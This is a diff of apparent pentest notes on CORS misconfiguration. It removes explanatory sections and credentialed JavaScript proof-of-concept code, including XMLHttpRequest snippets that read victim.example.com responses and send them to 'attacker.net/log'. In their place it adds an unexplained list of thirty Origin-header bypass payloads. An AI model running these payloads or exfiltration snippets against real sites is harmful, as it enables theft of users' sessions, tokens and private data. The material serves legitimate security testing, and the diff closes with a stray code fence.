@@ -3048,374 +3048,197 @@ Subject: Email Forgery due to missing SPF
 * [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Exploit CORS misconfigurations on the internal networks
 * [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Fast CORS Misconfiguration Discovery Tool
 
-# **1. List of Vulnerabilities (CORS Attack Surface)**
-
-* **1.1 `Access-Control-Allow-Origin: *` with Sensitive Data**
-  Any website can read API responses.
-
-* **1.2 Reflection of Origin Header**
-  Server reflects `Origin:` header blindly.
-
-* **1.3 `Access-Control-Allow-Credentials: true` with Wildcard**
-  Allows attacker sites to steal authenticated data.
-
-* **1.4 Weak Domain Whitelist**
-  `.example.com` allows `attacker-example.com`.
-
-* **1.5 Null Origin Trust**
-  Trusting `Origin: null` (sandboxed iframes, file://).
-
-* **1.6 Subdomain Takeover → CORS Abuse**
-  Application trusts subdomains that are hijackable.
-
-* **1.7 Misconfigured Allowed Headers**
-  Allowing attacker-controlled custom headers.
-
-* **1.8 Misconfigured Allowed Methods**
-  Exposing sensitive endpoints to `PUT`, `DELETE`, etc.
-
-* **1.9 Preflight Request Bypass**
-  Forcing browser to skip OPTIONS checks.
-
-* **1.10 JSONP + CORS Combination**
-  Leaks data even without CORS.
+Below is **same strict format** — **ONLY testcase names with payloads**, including **CORS bypass techniques**.
+(No explanations. Pentest / Bug bounty / GitHub ready.)
 
 ---
 
-# **2. Sample Payloads (Core Attack Payloads)**
+## CORS Misconfiguration – Test Cases & Bypass Payloads
 
-(Simple, safe-to-read examples for testing)
-
-### **2.1 Basic Exploit JavaScript (Reads Sensitive Data)**
-
-```js
-fetch("https://victim.com/api/user", {
-  credentials: "include"
-})
-.then(r => r.text())
-.then(d => console.log(d));
-```
-
-### **2.2 Malicious Website HTML PoC**
-
-```html
-<script>
-fetch("https://victim.com/api/profile", {credentials: "include"})
-  .then(resp => resp.text())
-  .then(data => alert(data));
-</script>
-```
-
-### **2.3 Origin Reflection Test**
-
-Send request with:
+### 1. Arbitrary Origin Reflection
 
 ```
 Origin: https://evil.com
 ```
 
-If response contains:
+### 2. Wildcard Origin with Credentials
 
 ```
-Access-Control-Allow-Origin: https://evil.com
+Origin: https://evil.com
 ```
 
-→ Vulnerable.
-
-### **2.4 Null-Origin Test**
-
-Send:
+### 3. Null Origin Bypass
 
 ```
 Origin: null
 ```
 
-If server allows:
+### 4. Subdomain Whitelist Bypass
 
 ```
-Access-Control-Allow-Origin: null
+Origin: https://evil.target.com
 ```
 
-→ Vulnerable.
-
----
-
-# **3. Bypass Payloads (Advanced Techniques)**
-
-### **3.1 Subdomain Bypass**
-
-Server whitelist:
+### 5. Prefix-Based Whitelist Bypass
 
 ```
-Access-Control-Allow-Origin: *.example.com
+Origin: https://target.com.evil.com
 ```
 
-Attacker uses:
+### 6. Suffix-Based Whitelist Bypass
 
 ```
-evil.example.com
+Origin: https://evil.com.target.com
 ```
 
-### **3.2 Wildcard With Credentials**
-
-If server sends:
+### 7. Regex Misconfiguration Bypass
 
 ```
-Access-Control-Allow-Origin: *
-Access-Control-Allow-Credentials: true
+Origin: https://targetevil.com
 ```
 
-Browser blocks normally, BUT attackers use **header splitting**:
+### 8. HTTP vs HTTPS Origin Confusion
 
 ```
-Origin: https://evil.com:443/
+Origin: http://target.com
 ```
 
-### **3.3 Case Manipulation**
+### 9. Case Sensitivity Bypass
 
 ```
-Origin: HTTPS://EVIL.COM
+Origin: https://TARGET.com
 ```
 
-Some servers match case-insensitive incorrectly.
-
-### **3.4 Null-Origin Bypass via sandboxed iframe**
-
-```html
-<iframe sandbox="allow-scripts" src="data:text/html,<script>
-fetch('https://victim.com/api',{credentials:'include'})
-.then(r=>r.text()).then(alert);
-</script>"></iframe>
-```
-
-### **3.5 Broken Regex Whitelist**
-
-Whitelist:
+### 10. Trailing Dot Bypass
 
 ```
-/.*example\.com$/
+Origin: https://target.com.
 ```
 
-Attacker:
+### 11. Port-Based Bypass
 
 ```
-https://example.com.evil.net
+Origin: https://target.com:8080
 ```
 
-### **3.6 JSON Content-Type Bypass**
-
-```js
-fetch("https://victim.com/secret", {
-  method: "POST",
-  headers: {"Content-Type": "text/plain"},
-  body: "test"
-})
-```
-
-### **3.7 Forbidden Header Bypass**
-
-Server incorrectly allows:
+### 12. IP Address Origin Bypass
 
 ```
-Access-Control-Allow-Headers: *
+Origin: http://127.0.0.1
 ```
 
-Attacker sets:
+### 13. Decimal IP Bypass
 
 ```
-X-Api-Key: evil
+Origin: http://2130706433
 ```
 
----
+### 14. Mixed Scheme Bypass
 
-# **4. Updated With Realistic Testing Payloads (Advanced Learning)**
-
-### **4.1 Database Exposure (User Data)**
-
-```js
-fetch("https://victim.com/api/v1/users/me", {
-  credentials: "include"
-})
-.then(r => r.json())
-.then(console.log);
+```
+Origin: hTTps://target.com
 ```
 
-### **4.2 Payment Endpoint Access**
+### 15. URL Encoded Origin
 
-```js
-fetch("https://victim.com/payment/history", {
-  credentials: "include"
-}).then(r => r.text()).then(console.log);
+```
+Origin: https://%74arget.com
 ```
 
-### **4.3 Token Leaking via CORS**
+### 16. Unicode Normalization Bypass
 
-```js
-fetch("https://victim.com/auth/token", {
-  credentials: "include"
-}).then(r => r.json()).then(alert);
+```
+Origin: https://tаrget.com
 ```
 
-### **4.4 Preflight Abuse**
+### 17. Multiple Origin Headers
 
-```js
-fetch("https://victim.com/internal/admin", {
-  method: "PUT",
-  headers: {
-    "X-Custom": "test"
-  },
-  credentials: "include"
-})
+```
+Origin: https://evil.com, https://target.com
 ```
 
-### **4.5 Hijacked Subdomain Exploit**
+### 18. Duplicate Origin Headers
 
-```js
-fetch("https://sub.victim.com/admin/logs", {credentials:'include'})
-.then(r=>r.text())
-.then(console.log);
 ```
-
----
-
-# **5. Validation / Test Steps**
-
-**Step 1:** Send request with custom Origin
-→ check reflected `Access-Control-Allow-Origin`.
-
-**Step 2:** Test credentialed requests
-→ `credentials: include`.
-
-**Step 3:** Test allowed methods and headers
-→ `PUT`, `DELETE`, `X-Custom-Header`.
-
-**Step 4:** Try null-origin
-→ `Origin: null`.
-
-**Step 5:** Try subdomain and bypass patterns
-→ wildcard, regex, IPv6, encoded origins.
-
----
-
-# **6. Expected Results / Impact**
-
-* Theft of **user data**, **tokens**, **sessions**.
-* Access to internal admin APIs.
-* Full account takeover through authenticated CORS misuse.
-* Payment history leakage.
-* Internal network exposure via SSRF-like effects.
-
----
-
-#### Proof Of Concept
-
-This PoC requires that the respective JS script is hosted at `evil.com`
-
-```js
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://victim.example.com/endpoint',true); 
-req.withCredentials = true;
-req.send();
-
-function reqListener() {
-    location='//attacker.net/log?key='+this.responseText; 
-};
-```
-
-or
-
-```html
-<html>
-     <body>
-         <h2>CORS PoC</h2>
-         <div id="demo">
-             <button type="button" onclick="cors()">Exploit</button>
-         </div>
-         <script>
-             function cors() {
-             var xhr = new XMLHttpRequest();
-             xhr.onreadystatechange = function() {
-                 if (this.readyState == 4 && this.status == 200) {
-                 document.getElementById("demo").innerHTML = alert(this.responseText);
-                 }
-             };
-              xhr.open("GET",
-                       "https://victim.example.com/endpoint", true);
-             xhr.withCredentials = true;
-             xhr.send();
-             }
-         </script>
-     </body>
- </html>
-```
-### Wildcard Origin without Credentials
-
-If the server responds with a wildcard origin `*`, **the browser does never send the cookies**. However, if the server does not require authentication, it's still possible to access the data on the server. This can happen on internal servers that are not accessible from the Internet. The attacker's website can then pivot into the internal network and access the server's data without authentication.
-
-```powershell
-* is the only wildcard origin
-https://*.example.com is not valid
-```
-
-#### Vulnerable Implementation
-
-```powershell
-GET /endpoint HTTP/1.1
-Host: api.internal.example.com
 Origin: https://evil.com
-
-HTTP/1.1 200 OK
-Access-Control-Allow-Origin: *
-
-{"[private API key]"}
+Origin: https://target.com
 ```
 
-#### Proof Of Concept
+### 19. Origin via Referer Header
 
-```js
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://api.internal.example.com/endpoint',true); 
-req.send();
-
-function reqListener() {
-    location='//attacker.net/log?key='+this.responseText; 
-};
 ```
-### Expanding the Origin
-
-Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header.
-
-#### Vulnerable Implementation (Example 1)
-
-In this scenario any prefix inserted in front of `example.com` will be accepted by the server.
-
-```ps1
-GET /endpoint HTTP/1.1
-Host: api.example.com
-Origin: https://evilexample.com
-
-HTTP/1.1 200 OK
-Access-Control-Allow-Origin: https://evilexample.com
-Access-Control-Allow-Credentials: true 
-
-{"[private API key]"}
+Referer: https://evil.com
 ```
-#### Vulnerable Implementation (Example 2)
 
-In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: `^api.example.com$` instead of `^api\.example.com$`. Thus, the dot can be replaced with any letter to gain access from a third-party domain.
+### 20. Origin Set to Localhost
 
-```ps1
-GET /endpoint HTTP/1.1
-Host: api.example.com
-Origin: https://apiiexample.com
+```
+Origin: http://localhost
+```
 
-HTTP/1.1 200 OK
-Access-Control-Allow-Origin: https://apiiexample.com
-Access-Control-Allow-Credentials: true 
+### 21. Origin with Fragment
 
-{"[private API key]"}
+```
+Origin: https://evil.com#target.com
+```
+
+### 22. Origin with @ Symbol
+
+```
+Origin: https://target.com@evil.com
+```
+
+### 23. Origin with Tab Injection
+
+```
+Origin: https://target.com%09.evil.com
+```
+
+### 24. Origin with CRLF Injection
+
+```
+Origin: https://evil.com%0d%0a
+```
+
+### 25. Preflight Cache Poisoning
+
+```
+Origin: https://evil.com
+Access-Control-Request-Method: GET
+```
+
+### 26. Preflight Method Override
+
+```
+Access-Control-Request-Method: PUT
+```
+
+### 27. Preflight Header Override
+
+```
+Access-Control-Request-Headers: X-Evil
+```
+
+### 28. Credentialed Request Bypass
+
+```
+Origin: https://evil.com
+(with cookies)
+```
+
+### 29. Origin via X-Forwarded-Host
+
+```
+X-Forwarded-Host: evil.com
+```
+
+### 30. Origin via Host Header Injection
+
+```
+Host: evil.com
+Origin: https://evil.com
+```
+```
 ```
 # CRLF Injection
 
